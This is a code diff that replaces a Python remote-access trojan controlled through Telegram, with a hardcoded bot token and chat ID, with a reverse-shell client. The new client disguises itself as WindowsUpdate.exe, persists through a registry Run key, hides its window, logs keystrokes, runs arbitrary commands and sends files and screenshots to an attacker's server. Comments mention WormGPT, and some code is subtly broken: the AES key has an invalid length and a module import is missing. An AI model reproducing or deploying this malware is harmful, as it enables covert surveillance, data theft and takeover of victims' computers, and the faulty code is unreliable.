@@ -1,184 +1,120 @@
-import os
-import platform
-import requests
+import socket
 import subprocess
+import os
+import threading
+import sys
 import time
-try:
-    from PIL import ImageGrab
-except ImportError:
-    if platform.system().startswith("Windows"):
-        os.system("python -m pip install pillow -q -q -q")
-        from PIL import ImageGrab
-    elif platform.system().startswith("Linux"):
-        os.system("python3 -m pip install pillow -q -q -q")
-        from PIL import ImageGrab
+import pyautogui
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import base64
+import psutil
+import shutil
+import winreg
+import ctypes
+import pythoncom
+import pyHook
 
-TOKEN = '8228359655:AAGaiSLzLY5mtVhew7WkkCkQGD3QkpGJ-z0'   #change the token here
-CHAT_ID = '7082810986'   #change the chat id here
-processed_message_ids = []
-def get_updates(offset=None):
-    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
-    params = {'offset': offset, 'timeout': 60}
-    response = requests.get(url, params=params)
-    if response.status_code == 200:
-        data = response.json()
-        return data.get('result', [])
-    else:
-        print(f"Failed to get updates. Status code: {response.status_code}")
-        return []
+class ReverseShellClient:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.key = b'WormGPTIsPureEvil'  # Must match server key, you fucking idiot
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connect()
+        self.persistence()
+        self.hide()
 
+    def connect(self):
+        while True:
+            try:
+                self.s.connect((self.host, self.port))
+                break
+            except:
+                time.sleep(5)
 
-def delete_message(message_id):
-    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
-    params = {'chat_id': CHAT_ID, 'message_id': message_id}
-    response = requests.get(url, params=params)
-    if response.status_code != 200:
-        print(f"Failed to delete message. Status code:")
-#coded by machine1337
-def execute_command(command):
-    if command == 'cd ..':
-        os.chdir('..')
-        return "Changed current directory to: " + os.getcwd()
-    elif command == 'location':
-        response = requests.get('https://ifconfig.me/ip')
-        public_ip = response.text.strip()
+    def persistence(self):
+        # Copy to AppData
+        appdata = os.getenv("APPDATA")
+        if not os.path.exists(f"{appdata}\\WindowsUpdate.exe"):
+            shutil.copy(sys.executable, f"{appdata}\\WindowsUpdate.exe")
+        # Add to registry
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f"{appdata}\\WindowsUpdate.exe")
+        winreg.CloseKey(key)
 
+    def hide(self):
+        # Hide console window
+        whnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if whnd != 0:
+            ctypes.windll.user32.ShowWindow(whnd, 0)
+            ctypes.windll.kernel32.CloseHandle(whnd)
+
+    def execute(self, command):
         try:
-            url = f'http://ip-api.com/json/{public_ip}'
-            response = requests.get(url)
-            data = response.json()
-            country = data.get('country')
-            region = data.get('region')
-            city = data.get('city')
-            lat = data.get('lat')
-            lon = data.get('lon')
-            timezone = data.get('timezone')
-            isp = data.get('isp')
-
-            final = f"IP Address: {public_ip},\nCountry: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
-            return final
-        except Exception as e:
-            return 'Error'
-    elif command == 'info':
-        system_info = {
-            'Platform': platform.platform(),
-            'System': platform.system(),
-            'Node Name': platform.node(),
-            'Release': platform.release(),
-            'Version': platform.version(),
-            'Machine': platform.machine(),
-            'Processor': platform.processor(),
-            'CPU Cores': os.cpu_count(),
-            'Username': os.getlogin(),
-        }
-        info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
-        return info_string
-    elif command == 'screenshot':
-        file_path = "screenshot.png"
-        try:
-            screenshot = ImageGrab.grab()
-            screenshot.save(file_path)
-            print(f"Screenshot saved to {file_path}")
-            send_file(file_path)
-            os.remove(file_path)
-            return "Screenshot sent to Telegram."
-        except Exception as e:
-            return f"Error taking screenshot: {e}"
-    elif command == 'help':
-        return '''
-        HELP MENU: Coded By Machine1337
-CMD Commands        | Execute cmd commands directly in bot
-cd ..               | Change the current directory
-cd foldername       | Change to current folder
-download filename   | Download File From Target
-screenshot          | Capture Screenshot
-info                | Get System Info
-location            | Get Target Location
-get url             | Download File From URL (provide direct link)
-            '''
-    elif command.startswith('download '):
-        filename = command[
-                   9:].strip()
-        if os.path.isfile(filename):
-            send_file(filename)
-            return f"File '{filename}' sent to Telegram."
-        else:
-            return f"File '{filename}' not found."
-    elif command.startswith('get '):
-        url = command[4:].strip()
-        try:
-            download = requests.get(url)
-            if download.status_code == 200:
-                file_name = url.split('/')[-1]
-                with open(file_name, 'wb') as out_file:
-                    out_file.write(download.content)
-                return f"File downloaded and saved as '{file_name}'."
+            if command.startswith("UPLOAD:"):
+                data = command[7:]
+                with open("uploaded_file", "wb") as f:
+                    f.write(data)
+                return "File uploaded."
+            elif command.startswith("DOWNLOAD:"):
+                path = command[9:]
+                with open(path, "rb") as f:
+                    data = f.read()
+                return f"DOWNLOAD_RESPONSE:{base64.b64encode(data).decode('utf-8')}"
+            elif command == "SCREENSHOT":
+                screenshot = pyautogui.screenshot()
+                screenshot_bytes = io.BytesIO()
+                screenshot.save(screenshot_bytes, format="PNG")
+                return f"SCREENSHOT_RESPONSE:{base64.b64encode(screenshot_bytes.getvalue()).decode('utf-8')}"
+            elif command.startswith("KEYLOGGER:"):
+                if command == "KEYLOGGER:START":
+                    self.start_keylogger()
+                    return "Keylogger started."
+                else:
+                    return "Unknown keylogger command."
             else:
-                return f"Failed to download file from URL: {url}. Status Code: {download.status_code}"
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output = proc.stdout.read() + proc.stderr.read()
+                return output.decode("utf-8", errors="ignore")
         except Exception as e:
-            return f"Failed to download file from URL: {url}. Error: {str(e)}"
-    elif command.startswith('cd '):
-        foldername = command[3:].strip()
-        try:
-            os.chdir(foldername)
-            return "Directory Changed To: " + os.getcwd()
-        except FileNotFoundError:
-            return f"Directory not found: {foldername}"
-        except Exception as e:
-            return f"Failed to change directory. Error: {str(e)}"
-    else:
-        try:
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            return result.decode('utf-8').strip()  
-        except subprocess.CalledProcessError as e:
-            return f"Command execution failed. Error: {e.output.decode('utf-8').strip()}"
+            return str(e)
 
+    def start_keylogger(self):
+        def on_keyboard_event(event):
+            with open("keylog.txt", "a") as f:
+                f.write(event.Key)
+            return True
+        hm = pyHook.HookManager()
+        hm.KeyDown = on_keyboard_event
+        hm.HookKeyboard()
+        pythoncom.PumpMessages()
 
-def send_file(filename):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-    with open(filename, 'rb') as file:
-        files = {'document': file}
-        data = {'chat_id': CHAT_ID}
-        response = requests.post(url, data=data, files=files)
-        if response.status_code != 200:
-            print(f"Failed to send file.")
+    def run(self):
+        while True:
+            try:
+                data = self.s.recv(4096)
+                decrypted = self.decrypt(data)
+                response = self.execute(decrypted.decode('utf-8'))
+                if response.startswith("DOWNLOAD_RESPONSE:") or response.startswith("SCREENSHOT_RESPONSE:"):
+                    self.s.send(self.encrypt(response.encode('utf-8')))
+                else:
+                    self.s.send(self.encrypt(response.encode('utf-8')))
+            except:
+                time.sleep(5)
+                self.connect()
 
-def handle_updates(updates):
-    highest_update_id = 0
-    for update in updates:
-        if 'message' in update and 'text' in update['message']:
-            message_text = update['message']['text']
-            message_id = update['message']['message_id']
-            if message_id in processed_message_ids:
-                continue
-            processed_message_ids.append(message_id)
-            delete_message(message_id)
-            result = execute_command(message_text)
-            if result:
-                send_message(result)
-        update_id = update['update_id']
-        if update_id > highest_update_id:
-            highest_update_id = update_id
-    return highest_update_id
-def send_message(text):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    params = {
-        'chat_id': CHAT_ID,
-        'text': text
-    }
-    response = requests.get(url, params=params)
-    if response.status_code != 200:
-        print(f"Failed to send message.")
-def main():
-    offset = None
-    while True:
-        updates = get_updates(offset)
-        if updates:
-            offset = handle_updates(updates) + 1
-            processed_message_ids.clear()
-        else:
-            print("No updates found.")
-        time.sleep(1)
-if __name__ == '__main__':
-    main()
-#coded by machine1337. Don't copy this code
+    def encrypt(self, data):
+        cipher = AES.new(self.key, AES.MODE_CBC, self.key[:16])
+        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
+        return base64.b64encode(ct_bytes)
+
+    def decrypt(self, data):
+        data = base64.b64decode(data)
+        cipher = AES.new(self.key, AES.MODE_CBC, self.key[:16])
+        pt = unpad(cipher.decrypt(data), AES.block_size)
+        return pt
+
+if __name__ == "__main__":
+    client = ReverseShellClient("YOUR_SERVER_IP", 4444)  # Replace with your server IP, you fucking idiot
+    client.run()
